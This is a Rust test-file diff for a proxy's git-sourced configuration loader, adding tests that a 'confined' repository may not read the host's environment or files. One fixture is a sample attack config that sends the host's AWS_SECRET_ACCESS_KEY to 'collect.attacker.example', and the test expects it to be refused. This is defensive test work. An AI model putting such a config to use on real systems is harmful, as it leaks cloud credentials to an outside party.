@@ -39,6 +39,21 @@ const REPO_CONFIG_V2: &str = "proxy:\n  http_bind_port: 9090\norigins:\n  \
                               \"edge.example.com\":\n    action:\n      type: proxy\n      \
                               url: https://test.sbproxy.dev\n";
 
+/// A document that names a per-node value the way
+/// docs/configuration.md's "Node identity in a shared repository"
+/// documents it. Confinement leaves this form alone; the two tests above
+/// pin the forms it does not.
+const REPO_CONFIG_WITH_ENV: &str = r#"proxy:
+  http_bind_port: 8080
+origins:
+  "edge.example.com":
+    action:
+      type: static
+      status_code: 200
+      content_type: text/plain
+      body: "${SB_DEFINITELY_UNSET_XYZZY:-fallback}"
+"#;
+
 /// Assert that a `SB_TEST_UNSET_*` variable really is unset.
 ///
 /// These names are reserved-unset: nothing in this workspace ever
@@ -147,9 +162,20 @@ fn git_source(repo: &str, revision: Option<&str>) -> ConfigSource {
         path: "sb.yml".to_string(),
         credential: None,
         verify_signature: false,
+        confine: false,
         timeout_secs: 120,
         refresh_interval_secs: 60,
     }
+}
+
+/// The same source with `confine: true`, the opt-in that says the
+/// repository is written by somebody other than whoever runs this proxy.
+fn confined_git_source(repo: &str, revision: Option<&str>) -> ConfigSource {
+    let mut source = git_source(repo, revision);
+    if let ConfigSource::Git { confine, .. } = &mut source {
+        *confine = true;
+    }
+    source
 }
 
 fn resolve(source: &ConfigSource) -> Result<ResolvedDocument, ConfigSourceError> {
@@ -265,6 +291,175 @@ fn a_pin_naming_a_commit_this_repository_does_not_have_is_refused() {
         "{error:?}",
     );
     assert!(error.to_string().contains(&absent), "{error}");
+}
+
+// --- confinement (WOR-2433) ------------------------------------------
+
+#[test]
+fn a_git_document_reading_this_hosts_environment_is_refused() {
+    // Named against the loader, not the checker: `check_confined_document`
+    // being correct proves nothing about this branch calling it, and this
+    // branch is the only place in the loader where config text arrives
+    // from a party that is not the host owner.
+    if !require_git("a_git_document_reading_this_hosts_environment_is_refused") {
+        return;
+    }
+    let fixture = Fixture::new(
+        r#"origins:
+  "exfil.test":
+    action:
+      type: proxy
+      url: https://collect.attacker.example
+    authentication:
+      type: api_key
+      api_key: "env:AWS_SECRET_ACCESS_KEY"
+"#,
+    );
+    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
+        .expect_err("a confined repository may not name this host's environment");
+    assert!(
+        matches!(error, ConfigSourceError::Confinement(_)),
+        "{error:?}",
+    );
+    assert_eq!(error.metric_label(), "confinement_refused");
+    assert!(
+        !error.is_unreachable(),
+        "the remote was reached; its content was refused"
+    );
+    assert!(error.to_string().contains("env:NAME"), "{error}");
+}
+
+#[test]
+fn a_git_document_naming_a_host_path_is_refused() {
+    if !require_git("a_git_document_naming_a_host_path_is_refused") {
+        return;
+    }
+    let fixture = Fixture::new(
+        r#"origins:
+  "edge.example.com":
+    request_modifiers:
+      - rego_module_path: /etc/sbproxy/anything.rego
+"#,
+    );
+    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
+        .expect_err("a confined repository may not name a path on the host that compiles it");
+    assert!(
+        matches!(error, ConfigSourceError::Confinement(_)),
+        "{error:?}",
+    );
+}
+
+#[test]
+fn a_git_document_may_still_name_per_node_variables() {
+    // Confinement must not have taken away the documented and only
+    // supported way to run one shared repository across a fleet.
+    if !require_git("a_git_document_may_still_name_per_node_variables") {
+        return;
+    }
+    let fixture = Fixture::new(REPO_CONFIG_WITH_ENV);
+    let resolved = resolve(&git_source(&fixture.url(), Some("main")))
+        .expect("a per-node `${VAR}` stays legal in a git-sourced document");
+    assert_eq!(
+        resolved.text, REPO_CONFIG_WITH_ENV,
+        "the loader must return the document byte for byte, not a rewritten copy",
+    );
+}
+
+#[test]
+fn an_unconfined_git_document_keeps_the_documented_secret_spellings() {
+    // The default, and the reason it is the default: flipping it on for
+    // everybody is a fail-closed upgrade. Every one of the three forms
+    // below is documented (docs/secrets.md) and shipped in the examples,
+    // and `env:` is what the Kubernetes operator generates, so a release
+    // that sealed them would refuse running fleets' own configs at boot.
+    // The reason is not that there would be no legal spelling left:
+    // `${VAR}` survives confinement and works for the cluster shared
+    // key, which `a_confined_document_may_name_its_shared_key_as_a_variable`
+    // pins (WOR-2433 re-review).
+    if !require_git("an_unconfined_git_document_keeps_the_documented_secret_spellings") {
+        return;
+    }
+    let document = r#"proxy:
+  http_bind_port: 8080
+  cluster:
+    security:
+      shared_key: "env:SB_CLUSTER_SHARED_KEY"
+origins:
+  "edge.example.com":
+    action:
+      type: proxy
+      url: https://test.sbproxy.dev
+    authentication:
+      type: api_key
+      api_key: "file:/run/secrets/api-key"
+    request_modifiers:
+      - rego_module_path: /etc/sbproxy/policy.rego
+"#;
+    let fixture = Fixture::new(document);
+
+    let resolved = resolve(&git_source(&fixture.url(), Some("main")))
+        .expect("an ordinary git source is the operator's own config store");
+
+    assert_eq!(
+        resolved.text, document,
+        "the loader must return the document byte for byte",
+    );
+}
+
+#[test]
+fn a_git_overlay_over_a_local_base_keeps_the_pointer_files_own_content() {
+    // The remedy every host-file refusal now names, and the one the
+    // docs used to get wrong by telling operators to "keep the value in
+    // the pointer file": for `kind: git` the pointer file's content is
+    // discarded outright, and `kind: git_overlay` with a `kind: local`
+    // base is the one arm that merges it (WOR-2433 re-review).
+    if !require_git("a_git_overlay_over_a_local_base_keeps_the_pointer_files_own_content") {
+        return;
+    }
+    let pointer = r#"proxy:
+  tls_cert_file: /etc/sbproxy/node.pem
+source:
+  kind: git_overlay
+"#;
+    let fixture = Fixture::new(REPO_CONFIG);
+    let source = ConfigSource::GitOverlay {
+        base: Box::new(ConfigSource::Local),
+        overlays: vec![confined_git_source(&fixture.url(), Some("main"))],
+    };
+
+    let resolved = load_source_blocking(&source, pointer, &FetchContext::with_git_binary())
+        .expect("a confined overlay over the operator's own file resolves");
+
+    assert!(
+        resolved
+            .text
+            .contains("tls_cert_file: /etc/sbproxy/node.pem"),
+        "the node-owned key from the pointer file must survive the merge: {}",
+        resolved.text
+    );
+    assert!(
+        resolved.text.contains("edge.example.com"),
+        "the repository's document must be merged over it: {}",
+        resolved.text
+    );
+}
+
+#[test]
+fn a_confined_documents_yaml_error_is_invalid_not_a_confinement_refusal() {
+    // The confinement check is the first parse of a fetched document, so
+    // without this it reports a plain YAML typo as a security refusal and
+    // climbs a counter that is supposed to mean "somebody tried to reach
+    // this host" (WOR-2433 re-review).
+    if !require_git("a_confined_documents_yaml_error_is_invalid_not_a_confinement_refusal") {
+        return;
+    }
+    let fixture = Fixture::new("origins:\n  \"edge.example.com\"\n    action: [unclosed\n");
+
+    let error = resolve(&confined_git_source(&fixture.url(), Some("main")))
+        .expect_err("a malformed document must fail");
+
+    assert!(matches!(error, ConfigSourceError::Invalid(_)), "{error:?}");
+    assert_eq!(error.metric_label(), "invalid");
 }
 
 // --- failure modes ---------------------------------------------------
